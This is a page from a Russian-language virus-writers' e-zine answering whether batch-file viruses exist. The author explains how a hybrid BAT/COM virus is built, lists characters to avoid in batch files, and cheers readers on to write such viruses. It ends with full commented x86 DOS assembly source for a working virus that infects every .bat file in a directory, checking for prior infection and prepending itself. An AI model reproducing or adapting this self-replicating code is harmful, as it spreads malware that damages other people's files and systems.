<HEAD>                                                                        
<TITLE>Virii magazin</TITLE>                                                     
<META HTTP-EQUIV="Content-Type" CONTENT="text/html">          
</head>
<base target=form4>
<body ALINK=white  TEXT=yellow VLINK=white link=white BACKGROUND=../../image/fon/bk7.jpg>
<div align=center><img src=../../image/line/r-spacer.jpg></div>
<pre>


B-6. Вирусы на BAT - это правда?
     
[VB]    Чистейшая правда. Такие извраты действительно существуют, однако их
	написание представляет собой не практический, а скорее творческий
	интерес. Уже хотя бы потому что эти вирусы элементарно обнаруживаются
	и истребляются - если вы посмотрите на бат-файл простым редактором,
	вы сразу много чего поймете :) Я понятно, не говорю о вирусах, которые
	вписывают в бат-файл только строчку @virname, это изврат, а не
	батничек. Я имею в виду полноценные вири, хранящие в зараженном
	бат-файле свое тело. Сразу и честно говорю, что я не имею морального
	права писать эту статью, поскольку я никогда бат-вирей не писал, ни
	разу! Hо, пожалуй, попробую. Вообще же вирусописательство на бат-языке
	можно разбить на два класса: вирусы, содержащие встроенный код, и
	вирусы, написанные на командах доса. Совершенно очевидно что первый
	тип вирусов имеет гораздо большие возможности, тогда как второй тип
	ограничен бат-языком, который вообще-то никто никогда не предполагал
	использовать для вирусописательства :))) Hо, тем не менее, на нем
	написан аж полиморф - я чуть со стула не е@#$улся, когда это увидел. ;)
	Если кто хочет пережить нехилое нервное потрясение - поглядите,
	называется BATalia6 - Reminder написал, был в IV#10, рекомендую.
	Hо это для продвинутых. Мне б такое и в страшном сне не привиделось,
	сколько б я пива не выпил. :) Hо приступим к делу. Итак начнем с
	вопроса что мы будем писать. Вопрос решаем весьма просто - поскольку
	я знаю бат-язык еще хуже суахили, писать мы будем на ассемблере. :)
	(Вспомнилось сразу: "Мы тут посовещались и я решил.")
	То бишь первый тип бат-вирусов. Итак что же наш вирь будет из себя
	представлять? Я думаю нечто вроде вот такой структуры:

@REM  ы6Р
@copy %0 ass.com>nul
@ass.com
@del ass.com
@REM ............
Краткий комментарий, который едва ли кому нужен. ;)
@REM  ы6Р		; просто комментарий, а по совместительству команды
			; inc ax, push dx, inc bp, dec bp, and dl,bh
			; это был непосредственно @REM
			; и jmp 13eh - это собссно ы6Р - переход куда нам надо
			; в бате это понятное дело не выполняется :)
@copy %0 ass.com>nul	; Создание файла ass.com, копии батника.
			; nul - место куда пойдет строка 1 file(s) copied,
			; кою дос любит выводить :)))
@ass.com		; запуск этого файла
@del ass.com		; потирание этого файла, чтоб под ногами не путался
@REM ............	; основная часть виря, чистый код.
	Hу а что до @ - это значит на экран не рисовать команду. Как
	говорится пей молча...
	А что можно сказать об основной части виря? Да ничего почти что.
	Этот примитив даже и в комментарии не нуждается. Все сделано в лоб.
	Поиск в текущем каталоге *.ВАТ файлов и их заражение. Плюс проверка
	на инфицированность братком и т.п. Как видите написание такого виря
	не представляет абсолютно никаких проблем, это была первая моя
	попытка такого рода, и я затратил на это полчаса. Даже и не интересно.
	Впрочем написание учебного вируса не может быть интересным по
	определению. Слишком все примитивно. Hо это конечно не последняя
	моя попытка написать вирь такого рода. Кажется я зря до сих пор
	пренебрегал батовыми зверями. Уверен что создание стелса такого
	типа обещает быть интересным... Полиморф для бат правда сделать
	сложнее чем для ком или екзе - необходимо помнить что не все символы
	разрешены в бат-файлах... Кстати тоже пунктик, чуть я его не
	пропустил. Итак чего нельзя ставить даже в ремах? Категорически
	запрещается символ с кодом 1А - это маркер конца бат-файла. Если он
	окажется даже в комментарии, то далее него выполнение не пойдет. Hе
	рекомендуется использовать также символы < и > - это указатели при
	операциях с файлами. Hо на них в принципе можно положить, если не
	давать строке комментария возможности выполниться, т.е. например
	поставить где надо goto. Поясню: есть строка rem dfhjdfh>hjg  -
	результат: будет создан файл hjg длиной ноль. Если строка
	rem dsg<ghsa - результат: при выполнении скажет что файл не найден
	Обход этой лажи:

	goto m
	rem тут любая фигня, кроме 1Ah
	:m

	Hо лучше так вообще не делать - возникает небольшой недостаток - не
	будут корректно заражаться батники с меткой m. :(
	Также стоит поостеречься символа ввод (0DH) - понятно почему? ;)))
	Hо это тоже обходится через goto.
	Может и еще есть пакость какая, а я просто об этом не знаю. Hо
	про что знал про то и сказал. Буду рад дополнениям. :)
	Теперь о грустном. :( К сожалению я не могу представить вам вирус,
	написанный чисто на досовых командах - слабоват я на это пока, не
	занимался никогда. Если кому-то действительно интересно как это
	делается, а это и правда интересно, то обратитесь к BATalia5
	(пять, не шесть!) Достаточно простой и красиво написанный вирус,
	правда медленный и несколько глючный, но лучше на досовых командах
	сделать трудно наверно. :) Hо все же, все же!.. А вирус написанный
	только через DOS-команды вообще сделать довольно сложно.
	Hадо проявить массу интеллекта и прочих хороших качеств. Сложность
	тут в том что надо выделить чистое тело вируса из основного файла,
	чтобы заразить что-то. А досовые команды copy или type умеют
	оперировать только с целым файлом, до метки 1Ah, про которую я уже
	говорил. Поэтому есть выбор - таскать за собой все зараженные файлы
	либо извращаться так что мало не покажется. Да и проверка на
	зараженность бат-файла средствами доса - тоже не сахар. :(
	Hе с точки зрения реализации, а с точки зрения как это придумать.
	В общем такое извращение может быть очень красивым, но шансов
	выжить у него практически нету. :((( Поймают сразу. Какой-нить
	ламер наверняка заинтересуется, почему это бат-файл, ранее
	выполнявшийся за секунду, теперь тормозит аж секунд 15. Hу а
	резидентом такой вирь тоже стать не может - нету в досовых
	командах такой функции как резидент из батника. ;))) Hу вы поняли
	что это шутка. ;))) То есть такой вирь может размножаться только
	в одном каталоге, и нигде более, ну плюс еще c:\autoexec.bat, и
	корень с ним. ;) В другие каталоги он может пролезть только при
	копировании батников, что само по себе дело довольно редкое.
	А как только его найдут - а найти просто - его сразу и уничтожат,
	и ведь он не может даже себя защитить. Можно сделать вирь со
	вставками кода, который будет заражать батники к примеру при
	закрытии - и долго ламерам лечить его придется. :))) А вирь на
	досовых командах - это как цветок, красивый, но кто хошь
	растопчет. :( А тема бат-вирусов действительно интересна. Короче...
	Пробуйте, пытайтесь, и откроется, и ниспошлется вам. Или на вас... ;)

	.286
	.model tiny
	.code
org 100h
start:
	db '@REM ',0fah			; это первая строка бат файла
	jmp run_it			; это то что в ней закомментировано ;)
	db 0dh,0ah,'@copy %0 ass.com>nul',0dh,0ah ; еще команды
	db '@ass.com',0dh,0ah		;
	db '@del ass.com',0dh,0ah	;
	db '@REM '			; последний комментарий
run_it:
	pop cx			; просто для понту :) Вы помните что там
				; REM обозначает в кодах?
	mov ah,4eh		; найти первый бат-файл
	lea dx,batname
	int 21h
	jc thats_all		; если нету - выйти нафиг
	jmp go_on
again:				; найти следующий бат-файл
	mov ah,4fh
	int 21h
	jc thats_all		; если нету - снова выйти :)
go_on:
	mov dx,9eh		; а если есть то
	mov ax,3d02h		; открыть его :)
	int 21h
	jc again		; обломались? перейдем к слудующему файлу
	mov bx,ax
	mov cx,ds:[9ah]		; длину файла в CX
	mov ah,3fh		; прочитать его весь в буфер
	lea dx,buffer
	int 21h	
	mov ax,word ptr ds:[start]	; сравнить первые байты
	cmp word ptr ds:[buffer],ax	; если равны, то там наш брат и надо
	jz close			; тихо закрыть файл.
	xor cx,cx			; станем на начало файла
	xor dx,dx			;
	mov ax,4200h			;
	int 21h				;
	mov ah,40h			; запишемся туда
	mov dx,100h			; 100h - наше начало в памяти
	mov cx,offset buffer-100h	; buffer - самый конец вируса ;) как
	; пошло...
	int 21h				;
	mov ah,40h			; запись в файл старого тела батника
	mov cx,ds:[9ah]			; cx=длина старого файла
	lea dx,buffer			; там он лежит - мы читали его
	int 21h				; пишемся
					; Кстати намек - эти две записи можно
					; пpовести в один пpием. :)
close:
	mov ah,3fh		; изврат, чтобы избежать символа > в теле
	dec ah			; батника - у него код 3eh - прямо как у
				; функции закрытия :)))
	int 21h
	jmp again		; прейти к следующему файлу
thats_all:			; и это все что я успел
	mov ax,4c00h		; выходим нафиг
	int 21h
batname db '*.bat',0		; маска для поиска батников
db 0dh,0ah			; символы ввода и перевода строки
buffer:				; конец виря - просто буфер
end start

</pre>
<div align=center><img src=../../image/line/r-spacer.jpg></div>
</body>

